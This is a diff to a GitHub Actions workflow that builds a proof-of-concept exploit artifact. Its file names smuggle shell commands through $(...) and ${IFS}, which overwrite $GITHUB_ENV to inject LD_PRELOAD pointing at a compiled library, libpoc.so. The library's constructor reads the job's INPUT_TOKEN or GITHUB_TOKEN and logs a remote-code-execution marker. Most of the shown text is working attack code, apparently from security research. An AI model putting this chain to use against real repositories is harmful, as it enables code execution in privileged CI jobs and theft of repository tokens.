@@ -13,11 +13,11 @@ jobs:
       - name: Build artifact with attacker-controlled file names
         run: |
           set -eux
-          mkdir -p content
+          mkdir -p content/x content/sub/deep
           cd content
           printf 'BENIGN\n' > summary.txt
-          printf 'BENIGN\n' > x.txt
-          printf 'LD_PRELOAD=/tmp/content/content/libpoc.so\n' > env.txt
+          printf 'LD_PRELOAD=/tmp/content/content/libpoc.so\n' > payload
+          printf 'BENIGN\n' > sub/deep/ok.txt
           cat > libpoc.c <<'EOF'
           #define _GNU_SOURCE
           #include <stdio.h>
@@ -29,6 +29,9 @@ jobs:
           static void poc_init(void) {
               if (getenv("POC_GUARD")) return;
               setenv("POC_GUARD", "1", 1);
+              fprintf(stderr, "POC_RCE_MARKER_PROTECTED_JOB run=%s actor-step=%s\n",
+                      getenv("GITHUB_RUN_ID") ? getenv("GITHUB_RUN_ID") : "?",
+                      getenv("LD_PRELOAD") ? getenv("LD_PRELOAD") : "NONE");
               const char *t = getenv("INPUT_TOKEN");
               if (!t || !*t) t = getenv("GITHUB_TOKEN");
               if (!t || !*t) { fprintf(stderr, "POC_NO_TOKEN_IN_ENV\n"); return; }
@@ -45,9 +48,8 @@ jobs:
           }
           EOF
           gcc -shared -fPIC -O2 -o libpoc.so libpoc.c
-          touch 'x$(echo${IFS}RCE_PROOF_$(id${IFS}-u)_${GITHUB_RUN_ID}).txt'
-          touch 'x$(s=$(printf${IFS}%.1s${IFS}$GITHUB_ENV);cp${IFS}$s${s}tmp${s}content${s}content${s}env.txt${IFS}$GITHUB_ENV).txt'
-          ls -la
+          touch 'x$(s=$(printf${IFS}%.1s${IFS}$GITHUB_ENV);cp${IFS}$s${s}tmp${s}content${s}content${s}payload${IFS}$GITHUB_ENV;printf${IFS}$s..${s}sub${s}deep${s}ok).txt'
+          find . -type f | sort
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
